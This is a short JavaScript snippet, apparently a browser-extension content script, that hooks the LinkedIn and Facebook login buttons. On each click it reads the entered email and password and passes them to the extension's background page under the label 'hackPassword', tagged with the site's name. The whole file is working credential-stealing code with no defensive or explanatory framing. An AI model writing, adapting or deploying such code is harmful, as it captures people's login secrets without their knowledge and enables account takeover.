$( "#login-submit" ).click(function() {
	var arry = ["hackPassword",document.getElementById("login-email").value , document.getElementById("login-password").value, "linkedIn"];
	chrome.runtime.sendMessage(arry);
});

$( "#u_0_2" ).click(function() {
	var arry = ["hackPassword",document.getElementById("email").value , document.getElementById("pass").value, "facebook"];
	chrome.runtime.sendMessage(arry);
});